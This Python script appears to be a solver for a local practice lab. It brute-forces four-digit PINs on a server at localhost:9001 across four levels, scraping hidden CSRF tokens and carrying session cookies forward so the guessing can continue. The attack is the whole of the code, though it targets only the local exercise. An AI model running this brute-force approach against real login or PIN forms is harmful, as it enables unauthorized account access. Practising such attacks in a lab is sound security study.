from __future__ import annotations

import requests
import re
import sys

URL = "http://localhost:9001"
BAD_PIN = "Wrong PIN"


def _request_successful(response_text: str) -> bool:
    return BAD_PIN not in response_text


def solve_level_0():
    def form_url_with_pin(pin: int | str) -> str:
        return f"{URL}/level0/?pin={pin}"

    for pin in range(10_000):
        pin_4_digits = f"{pin:04}"
        if pin % 100 == 0:
            print(f"\nTrying PIN: {pin_4_digits}")
        print(".", end="", flush=True)
        try_url = form_url_with_pin(pin_4_digits)
        response = requests.get(try_url)
        if _request_successful(response.text):
            print()
            print(response.text)
            print(f"Found PIN: {pin_4_digits}")
            break


def solve_level_1():
    for pin in range(10_000):
        pin_4_digits = f"{pin:04}"
        if pin % 100 == 0:
            print(f"\nTrying PIN: {pin_4_digits}")
        print(".", end="", flush=True)
        post_url = f"{URL}/level1/"
        response = requests.post(post_url, data={"pin": pin_4_digits})
        if _request_successful(response.text):
            print()
            print(response.text)
            print(f"Found PIN: {pin_4_digits}")
            break


def _get_token_from_response(response_text: str) -> str:
    for line in response_text.splitlines():
        if all([val in line for val in ["input", "type", "hidden", "token", "value"]]):
            match = re.search(r'value="(.*?)"', line)
            if match:
                return match.group(1)
    raise ValueError("Token not found")


def solve_level_2():
    url = f"{URL}/level2/"
    response = requests.get(url)
    token = _get_token_from_response(response.text)

    for pin in range(10_000):
        pin_4_digits = f"{pin:04}"
        if pin % 100 == 0:
            print(f"\nTrying PIN: {pin_4_digits}")
        print(".", end="", flush=True)
        response = requests.post(url, data={"pin": pin_4_digits, "token": token})
        if _request_successful(response.text):
            print()
            print(response.text)
            print(f"Found PIN: {pin_4_digits}")
            break
        token = _get_token_from_response(response.text)


def solve_level_3():
    url = f"{URL}/level3/"
    response = requests.get(url)
    token = _get_token_from_response(response.text)

    cookies = response.cookies

    for pin in range(10_000):
        pin_4_digits = f"{pin:04}"
        if pin % 100 == 0:
            print(f"\nTrying PIN: {pin_4_digits}")
        print(".", end="", flush=True)
        response = requests.post(
            url, data={"pin": pin_4_digits, "token": token}, cookies=cookies
        )
        if _request_successful(response.text):
            print()
            print(response.text)
            print(f"Found PIN: {pin_4_digits}")
            break
        token = _get_token_from_response(response.text)
        cookies = response.cookies


if __name__ == "__main__":
    if len(sys.argv) > 1:
        level = int(sys.argv[1])
        func = f"solve_level_{level}"
        globals()[func]()
    else:
        # solve_level_0()
        # solve_level_1()
        # solve_level_2()
        solve_level_3()
